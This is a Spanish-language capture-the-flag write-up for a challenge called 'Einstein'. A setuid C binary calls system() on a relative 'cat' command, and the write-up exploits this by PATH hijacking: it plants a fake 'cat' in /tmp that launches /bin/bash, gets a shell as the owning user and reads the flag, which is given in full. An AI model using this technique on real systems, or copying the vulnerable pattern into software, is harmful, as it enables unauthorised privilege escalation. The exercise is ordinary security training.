# Einstein

## Enunciado del Reto
>~~~
>1. The laws of physics are the same for all observers in any inertial frame of reference relative to one another (principle of relativity).
>2. The speed of light in vacuum is the same for all observers, regardless of their relative motion or of the motion of the light source.
>~~~

## Archivos

- Ninguno

- - -

## Solución

Entramos en la máquina y hacemos `ls` para ver que con que ficheros vamos a trabajar.

>~~~
>user@einstein:~$ ls -l
>total 20
>-rwsr-sr-x 1 einstein einstein 16160 Oct 25 17:36 learn
>-rw-r--r-- 1 einstein einstein   679 Oct 25 17:35 learn.c
>~~~

Abriremos el fichero de código para ver su contenido.

```c
#include <stdio.h>
#include <unistd.h>

int main() {
    // Welcome message
    printf("Welcome to this physics course! All information on this course is not copied from the internet without fact check and is completely riginal.\n");
    printf("\n===================================\n\n");

    // Execute cat command
    setreuid(geteuid(), geteuid()); // Because system() runs sh that resets euid to uid if they don't match
                                    // Otherwise we could not read /home/einstein/theory.txt
    char command[30] = "cat /home/einstein/theory.txt";
    if (system(command) == -1) {
        perror("system");
        return 1;
    }

    return 0;
```

Viendo la manera en la que se ejecuta el comando (función `system()`) y la función para cambiar el UID del binario al UID de einstein, intuimos que debemos explotar la variable de entorno `PATH` para escalar privilegios y abrir un fichero que se encontrará en el directorio `/home/einstein`.

Primero, crearemos un fichero en el directorio `/tmp` que contenga el comando que queremos ejecutar, en este caso `/bin/bash`. El nombre del fichero será `cat`, ya que es el comando que ejecuta el programa de antes. Además daremos permisos de ejecución a este nuevo fichero.

>~~~
>user@einstein:~$ cd /tmp/
>user@einstein:/tmp$ echo "/bin/bash" > cat
>user@einstein:/tmp$ chmod +x cat
>~~~

Ahora tenemos que hacer que cuando la máquina ejecute el comando `cat`, se ejecute el que hemos creado y no el que se encuentra en `/usr/bin/`. Cambiaremos la variable de entorno `PATH` y añadiremos el directorio `/tmp` al principio.

>~~~
>user@einstein:/tmp$ which cat
>/usr/bin/cat
>user@einstein:/tmp$ export PATH=/tmp:$PATH
>user@einstein:/tmp$ which cat
>/tmp/cat
>~~~

Después, simplemente ejecutaremos el binario `learn` del principio y obtendremos una shell con el usuario einstein.

>~~~
>user@einstein:~$ ./learn
>Welcome to this physics course! All information on this course is not copied from the internet without fact check and is completely riginal.
>
>===================================
>
>bash: /home/user/.bashrc: Permission denied
>einstein@einstein:~$ whoami
>einstein
>~~~

Para finalizar, leeremos el fichero `/home/einstein/flag.txt` que contiene la flag. No podemos usar el comando `cat` directamente porque recordemos que antes lo hemos modificado.

>~~~
>einstein@einstein:/home/einstein$ /bin/cat /home/einstein/flag.txt
>Hero{th30ry_of_r3l4tiv3_p4th5}
>~~~

## Flag

```
Hero{th30ry_of_r3l4tiv3_p4th5}
```
